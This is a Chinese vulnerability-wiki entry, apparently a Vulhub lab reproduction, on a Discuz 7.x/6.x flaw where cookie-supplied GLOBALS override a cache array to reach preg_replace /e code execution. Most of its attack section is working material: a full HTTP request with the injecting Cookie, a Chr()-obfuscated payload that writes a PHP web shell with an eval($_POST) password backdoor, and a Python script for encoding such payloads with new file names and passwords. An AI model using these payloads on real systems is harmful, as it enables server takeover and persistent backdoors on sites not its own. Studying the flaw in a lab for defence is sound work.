---
source: "Threekiii/Vulnerability-Wiki"
product: "Discuz6.x/7.x"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "Discuz-7.x6.x-全局变量防御绕过导致代码执行"
prerequisites: "来源所述条件，未列明部分仍待核：PHP5.3 request_order excludes cookies; vulnerable global registration; preg_replace/e supported; existing renderable thread"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "unknown"
id: "vw-eba8fbb8239eea7f155238b7"
entity_id: "ve-eba8fbb8239eea7f155238b7"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：PHP5.3 request_order excludes cookies; vulnerable global registration; preg_replace/e supported; existing renderable thread

- **结论使用边界（1）**：Core request_order prerequisite stated; PHP7+ removal of/e and exact vulnerable builds omitted。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **证据待核（2）**：No source excerpt for variable-registration path; original analysis linked。保留原引用、截图位置和实验叙述；本项所缺材料未被补造，截图存在或作者宣称成功都不等于已核验其内容。

- **结论使用边界（3）**：ASCII helper decoder example differs shell filename/password from main payload; label alternate example。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# Discuz 7.x/6.x 全局变量防御绕过导致代码执行

## 漏洞描述

由于php5.3.x版本里php.ini的设置里`request_order`默认值为GP，导致`$_REQUEST`中不再包含`$_COOKIE`，也就是说默认配置下`$_REQUEST`只包含`$_GET`和`$_POST`而不包括$_COOKIE。

我们通过在Cookie中传入`$GLOBALS`来覆盖全局变量，造成代码执行漏洞。

具体原理请参考：

- https://www.secpulse.com/archives/2338.html

## 环境搭建

Vulhub执行如下命令启动Discuz 7.2：

```
docker-compose up -d
```

启动后，访问`http://your-ip:8080/install/`来安装discuz，数据库地址填写`db`，数据库名为`discuz`，数据库账号密码均为`root`。

![image-20220222112715390](./.resource/Discuz-7.x6.x-全局变量防御绕过导致代码执行/media/202202221127521.png)


## 漏洞复现

安装成功后，直接找一个已存在的帖子，向其发送数据包，并在Cookie中增加`GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=phpinfo();`：

```
GET /viewthread.php?tid=10&extra=page%3D1 HTTP/1.1
Host: your-ip:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Cookie: GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=phpinfo();
Connection: close
```

![image-20220222112923996](./.resource/Discuz-7.x6.x-全局变量防御绕过导致代码执行/media/202202221129105.png)


同样方法传入以下Cookie写入一句话木马文件，文件为x.php，密码为pwd

```
Cookie: GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=eval(Chr(102).Chr(112).Chr(117).Chr(116).Chr(115).Chr(40).Chr(102).Chr(111).Chr(112).Chr(101).Chr(110).Chr(40).Chr(39).Chr(120).Chr(46).Chr(112).Chr(104).Chr(112).Chr(39).Chr(44).Chr(39).Chr(119).Chr(39).Chr(41).Chr(44).Chr(39).Chr(60).Chr(63).Chr(112).Chr(104).Chr(112).Chr(32).Chr(64).Chr(101).Chr(118).Chr(97).Chr(108).Chr(40).Chr(36).Chr(95).Chr(80).Chr(79).Chr(83).Chr(84).Chr(91).Chr(112).Chr(119).Chr(100).Chr(93).Chr(41).Chr(63).Chr(62).Chr(39).Chr(41).Chr(59))
```

ASCII码和字符互相转换的小脚本，方便修改POC的文件名和密码：

```
import re
# ASCII = ord(Word)
# Word = chr(ASCII)

# ASCII -> Word
def ASCII2word(ASCIIs):
	for c in re.findall(r"(\d+)", ASCIIs):
	    print(chr(int(c)),end="")

# Word -> ASCII
def word2ASCII(words):
	ASCIIs = ""
	for word in words:
		ASCIIs += "Chr(" + str(ord(word)) + ")."
	print(ASCIIs)

print("----------ASCII TO WORD---------------------")

asciis = "Chr(102).Chr(112).Chr(117).Chr(116).Chr(115).Chr(40).Chr(102).Chr(111).Chr(112).Chr(101).Chr(110).Chr(40).Chr(39).Chr(109).Chr(105).Chr(115).Chr(104).Chr(105).Chr(46).Chr(112).Chr(104).Chr(112).Chr(39).Chr(44).Chr(39).Chr(119).Chr(39).Chr(41).Chr(44).Chr(39).Chr(60).Chr(63).Chr(112).Chr(104).Chr(112).Chr(32).Chr(64).Chr(101).Chr(118).Chr(97).Chr(108).Chr(40).Chr(36).Chr(95).Chr(80).Chr(79).Chr(83).Chr(84).Chr(91).Chr(116).Chr(101).Chr(115).Chr(116).Chr(93).Chr(41).Chr(63).Chr(62).Chr(39).Chr(41).Chr(59)"
ASCII2word(asciis)

print("\n\n----------WORD TO ASCII--------------------")

words = "fputs(fopen('x.php','w'),'<?php @eval($_POST[pwd])?>');"
word2ASCII(words)
```


---

> 来源：Threekiii/Vulnerability-Wiki（https://github.com/Threekiii/Vulnerability-Wiki）
